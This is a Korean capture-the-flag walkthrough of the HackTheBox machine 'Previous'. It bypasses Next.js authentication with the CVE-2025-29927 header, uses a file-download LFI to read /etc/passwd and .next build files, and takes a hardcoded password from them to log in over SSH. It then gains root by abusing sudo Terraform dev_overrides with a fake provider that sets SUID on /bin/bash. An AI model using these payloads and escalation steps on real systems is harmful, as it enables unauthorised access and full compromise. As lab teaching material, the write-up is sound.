---
title: "Previous (Medium)"
date: 2025-11-19
layout: single
excerpt: "Previous는 중간 난이도의 Linux 머신으로, Next.js 기반 웹 애플리케이션에서 발생하는 Middleware Authorization Bypass(CVE-2025-29927)를 통해 인증을 우회할 수 있다. 이후 파일 다운로드 기능에서 LFI 취약점을 활용해 .next 디렉터리 내부 파일을 열람하고, 노출된 Credentials Provider 설정을 통해 SSH 접근에 성공한다. 이후 sudo -l 열거를 통하여 sudo로 실행 가능한 Terraform 설정을 악용해 dev_overrides를 구성하고, 임의 provider 실행을 통해 SUID가 설정된 /bin/bash를 획득함으로써 최종적으로 루트 권한을 탈취한다."
author_profile: true
toc: true
toc_label: "Previous"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/previous/previous.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, linux, web, nextjs, middleware-bypass, cve-2025-29927, lfi, file-disclosure, credentials-leak, ssh, terraform, dev-overrides, sudo, priv-esc, suid, local-exploit]
---

![Previous](/assets/htb-linux/previous/previous.png)

**Previous**는 중간 난이도의 Linux 머신으로,  
Next.js 기반 웹 애플리케이션에서 발생하는 **Middleware Authorization Bypass (CVE-2025-29927)** 를 통해 인증을 우회할 수 있다.  

이후 파일 다운로드 기능에서 **LFI(Local File Inclusion)** 취약점을 활용해 `.next` 디렉터리 내부 파일을 열람하고,  
노출된 **Credentials Provider 설정**을 통해 SSH 접근에 성공한다.  

이후 `sudo -l` 열거를 통하여 **sudo로 실행 가능한 Terraform 설정**을 악용해 `dev_overrides` 를 구성하고,  
임의 **provider 실행**을 통해 SUID가 설정된 `/bin/bash` 를 획득함으로써 최종적으로 루트 권한을 탈취한다.


# Enumeration

## Portscan

먼저 대상 Host(`10.129.242.162`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.242.162 | tee nmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 00:51 EST
Nmap scan report for previous.htb (10.129.242.162)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: PreviousJS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds
```

Nmap 스캔 결과, `SSH(22)`/`HTTP(80)` 서비스가 열려 있으며, `HTTP(80)` 포트 에서는 `nginx` 웹 서버가 구동 중이다.

---

# Vulnerability Analysis

웹 페이지에 접속한 결과, 다음과 같은 화면이 나타났다:

![웹 페이지](/assets/htb-linux/previous/web.png)

해당 페이지는 **PreviousJS**라는 프레임워크를 소개하는 랜딩 페이지로 구성되어 있다.

`Get Started` 버튼을 클릭하면 로그인 페이지로 이동된다:

![로그인](/assets/htb-linux/previous/login.png)

하지만 로그인에 필요한 자격 증명 정보나 별도의 회원가입/인증 수단이 제공되지 않는다.

## Next.js Middleware Authorization Bypass (CVE-2025-29927)

`PreviousJS` 에 대해 추가적으로 조사한 결과, 하나의 [CVE-2025-29927](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass) 취약점이 존재하는 것이 확인되었다.

이 취약점은 `Next.js` 기반 애플리케이션에서 **인증 미들웨어 우회가 가능한 취약점**으로, 특정 조건하에서 인증 없이 보호된 경로에 접근이 가능하다.

`x-middleware-subrequest` 헤더를 조작함으로써, **11.1.4부터 15.2.2 버전까지**의 애플리케이션에서 인증 미들웨어를 우회할 수 있다.  
해당 헤더에 특정 값을 삽입하면, 요청이 내부 미들웨어를 우회하고 직접적으로 리소스에 접근하게 된다.

`curl` 명령어를 사용하여 HTTP 헤더를 확인한 결과, 해당 웹 사이트가 `Next.js` 기반으로 동작하고 있음이 확인되었다:

```bash
$ curl -i http://previous.htb  

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 12 Dec 2025 07:21:36 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5493
Connection: keep-alive
X-Powered-By: Next.js
ETag: "13jykjsocr048k"
Vary: Accept-Encoding

# [SKIP]
```

### Directory Listing

해당 웹 사이트에 대해 디렉토리 브루트포싱을 수행한 결과, 다음과 같은 경로들을 확인할 수 있었다:

```bash
$ gobuster dir -u http://previous.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100                

/docs                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fdocs]
/api                  (Status: 307) [Size: 35] [--> /api/auth/signin?callbackUrl=%2Fapi]
/signin               (Status: 200) [Size: 3481]
/docsis               (Status: 307) [Size: 38] [--> /api/auth/signin?callbackUrl=%2Fdocsis]
/apis                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fapis]
/apidocs              (Status: 307) [Size: 39] [--> /api/auth/signin?callbackUrl=%2Fapidocs]
# [SKIP]
```

`/docs`, `/api` 등의 경로에 접근할 때 `307 Redirect` 와 함께 `/api/auth/signin` 으로 리다이렉션 되는 것으로 보아, 해당 경로들은 `Next.js` 기반 인증 미들웨어에 의해 보호되고 있는 것으로 판단된다.

이후 `x-middleware-subrequest` 헤더에 특정 값인 `middleware:middleware:middleware:middleware:middleware` 를 삽입한 상태로 요청을 보낸 결과,  
기존에 `307 Redirect`를 반환하던 경로에서 **`200 OK` 응답이 반환되는 것**을 확인할 수 있었다:

```bash
$ gobuster dir -u http://previous.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

/docs                 (Status: 200) [Size: 3353]
/signin               (Status: 200) [Size: 3481]
# [SKIP]
```

### Discovery of Downloadable Files

이후 Burp Suite를 이용하여 헤더에 `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` 를 추가한 후 `/docs` 페이지를 분석하였다:

![Burp Suite](/assets/htb-linux/previous/example.png)

페이지 소스에서 `/docs/examples` 경로가 존재하는 것이 확인되었고, 해당 경로로 이동해보면 다음과 같은 콘텐츠가 표시된다:

![Download](/assets/htb-linux/previous/download.png)

`examples` 페이지에는 파일을 다운로드할 수 있는 링크가 포함되어 있으며, 해당 링크의 주소는 다음과 같다:

```http
http://previous.htb/api/download?example=hello-world.ts
```

## LFI

위 다운로드 경로에서 `example` 파라미터에 `/etc/passwd` 요청을 전송한 결과 다음과 같이 **LFI 취약점**이 발견된 것을 확인할 수 있었다:

![LFI](/assets/htb-linux/previous/lfi.png)

이후 `/proc/self/environ` 경로를 통해 현재 프로세스의 환경 변수를 확인해본 결과, 작업 디렉토리가 `/app` 으로 설정되어 있는 것을 확인할 수 있다:

![환경 변수](/assets/htb-linux/previous/pwd.png)

### Understanding the .next Directory

Next.js에서는 `npm run dev` 또는 `npm run build` 명령 실행 시 `.next` 디렉터리가 자동으로 생성된다.
이 디렉터리는 Next.js 애플리케이션의 빌드 및 실행에 필요한 정적 자원, 라우팅 메타데이터, 서버 렌더링 결과물 등 다양한 내부 파일을 포함한다.

> **`.next` 폴더의 관련한 내용은 이 [블로그](https://myfirstblog123.hashnode.dev/unlocking-the-secrets-of-the-next-folder-in-nextjs)를 참고하였다.**

---

# Exploitation

## From LFI to Remote Shell

우선, 내부 애플리케이션의 경로를 파악하기 위해 `/app/.next/routes-manifest.json` 파일을 열어 분석하였다:

```json
{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
    {
      "page": "/docs/[section]",
      "regex": "^/docs/([^/]+?)(?:/)?$",
      "routeKeys": {
        "nxtPsection": "nxtPsection"
      },
      "namedRegex": "^/docs/(?<nxtPsection>[^/]+?)(?:/)?$"
    }
  ]
  // [SKIP]
}
```

위의 라우팅 정보에서 `/api/auth/[...nextauth]` 와 `/docs/[section]` 과 같은 [동적 라우팅](https://nextjs.org/docs/pages/building-your-application/routing/dynamic-routes)이 설정되어 있는 것을 확인할 수 있다.

이 동적 라우팅은 하위 경로 전체를 하나의 배열 형태로 캡처한다. 따라서 `[...nextauth].js` 와 같이 정의하면, `/api/auth/` 하위의 **모든 경로 요청을 하나의 배열로 수신**할 수 있게 된다.

`/app/.next/server/pages/api/auth/[...nextauth].js` 파일을 확인한 결과, Credentials Provider 설정에서 **자격증명 정보가 포함되어 있는 것**을 확인할 수 있었다:

```html
...[SKIP]...

session: { strategy: "jwt" },
providers: [
r.n(u)()({
    name: "Credentials",
    credentials: {
    username: { label: "User", type: "username" },
    password: { label: "Password", type: "password" },
    },
    authorize: async e =>
    e?.username === "jeremy" &&
    e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
        ? { id: "1", name: "Jeremy" }
        : null
})

...[SKIP]...
```

> **노출된 자격증명은 다음과 같다: `Jeremy` / `MyNameIsJeremyAndILovePancakes`**

자격증명 정보를 기반으로 SSH 연결을 시도한 결과, 정상적으로 셸 접근에 성공하였다:

```bash
$ sshpass -p MyNameIsJeremyAndILovePancakes ssh jeremy@10.129.242.162

jeremy@previous:~$ id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
```

---

# Privilege Escalation

## Enumerating sudo Privileges

`sudo -l` 명령어를 통해 `jeremy` 사용자가 수행할 수 있는 권한을 확인한 결과, 다음과 같이 출력되었다:

```bash
$ sudo -l

Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```
`jeremy` 사용자는 `terraform` 바이너리를 `-chdir=/opt/examples` 옵션과 함께 `apply` 명령어로 루트 권한으로 실행할 수 있다.

또한, `sudoers` 설정에 `!env_reset` 옵션이 지정되어 있어, `sudo` 실행 시 사용자의 환경 변수가 유지된다.

## Reviewing the main.tf Configuration

`/opt/examples` 경로에는 `main.tf` 와 `terraform.tfstate` 두 개의 파일이 존재한다.

그 중 `main.tf` 파일의 내용은 다음과 같다:

```bash
$ cat main.tf

terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

위 내용 중 `required_providers` 블록은 [Terraform](https://developer.hashicorp.com/terraform/language/block/terraform#required_providers) 에서 사용할 프로바이더의 소스 주소와 이름을 지정하는 역할을 한다.

`main.tf` 에서 지정된 `examples` 프로바이더의 기본 provider 바이너리는 Terraform 에 의해 다음 경로에 설치되어 있다:

```bash
jeremy@previous:/opt/examples/.terraform/providers/previous.htb/terraform/examples/1.0.0$ ls

linux_amd64
```

이 디렉터리 구조는 `required_providers` 에서 명시된 소스 주소(`previous.htb/terraform/examples`)와 일치한다.

## Using dev_overrides in Terraform

[Terraform Provider Installation](https://developer.hashicorp.com/terraform/cli/config/config-file#provider-installation) 문서를 살펴보면 `provider_installation` 블록을 통해 Terraform의 기본 프로바이더 설치 동작을 재정의할 수 있다.

그리고 [Terraform Debugging](https://developer.hashicorp.com/terraform/plugin/debugging#terraform-cli-development-overrides) 문서에 따르면, 해당 블록 내 `dev_overrides` 옵션을 사용하면 로컬 파일 시스템의 `provider` 바이너리를 사용하여 디버깅을 수행할 수 있다.

이를 적용하기 위해 다음과 같은 조건이 필요하다:

1. 설정 파일은 운영체제에 따라 지정된 이름을 사용해야 한다.
    - Linux / macOS: `~/.terraformrc`
    - Windows: `terraform.rc`
2. 설정 파일을 임의의 경로 또는 다른 이름으로 둘 경우, Terraform 에 해당 경로를 인식시키기 위해 **환경 변수를 설정**해야 한다:

```bash
export TF_CLI_CONFIG_FILE=<setting-file-name>
```

3. `dev_overrides` 블록에 지정한 경로에는 `terraform-provider-<provider-name>` 형식의 바이너리 파일이 **실제로 존재**해야 한다.

## Abusing Terraform dev_overrides for Privilege Escalation

현재 `jeremy` 사용자 홈 디렉토리에 Terraform CLI 설정 파일인 `.terraformrc` 가 존재하는 것을 확인하였다:

```bash
jeremy@previous:~$ ls -al

-rw-rw-r-- 1 jeremy jeremy  145 Dec 12 13:14 .terraformrc
```

`.terraformrc` 파일의 내용을 다음과 같이 수정하였다:

```bash
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/home/jeremy"
        }
        direct {}
}
```

이후 `dev_overrides` 블록에서 지정한 경로에 Terraform 이 인식할 수 있는 **provider 바이너리 파일을 생성**하였다:

```bash
jeremy@previous:~$ cat terraform-provider-examples

#!/bin/bash
chmod +s /bin/bash
```

그 후, 생성한 provider 바이너리 파일에 실행 권한을 부여한 뒤, `sudo -l` 을 통해 확인한 권한을 이용하여 다음 명령어를 실행하였다:

```bash
jeremy@previous:~$ chmod +x terraform-provider-examples
```

```bash
jeremy@previous:~$ sudo /usr/bin/terraform -chdir\=/opt/examples apply

# [SKIP]

│ schema: Unrecognized remote plugin message: 
│ Failed to read any lines from plugin's stdout
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│ 
│ Additional notes about plugin:
│   Path: /home/jeremy/terraform-provider-examples
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│ ..
```

`/bin/bash` 의 권한을 확인한 결과, SUID 비트가 설정되어 있는 것을 확인할 수 있었다:

```bash
jeremy@previous:~$ ls -l /bin/bash

-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

이후 `-p` 옵션을 사용하여 루트 권한 획득에 성공하였다:

![루트](/assets/htb-linux/previous/root.png)

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다:

![루트 플래그 획득](/assets/htb-linux/previous/flag.png)



















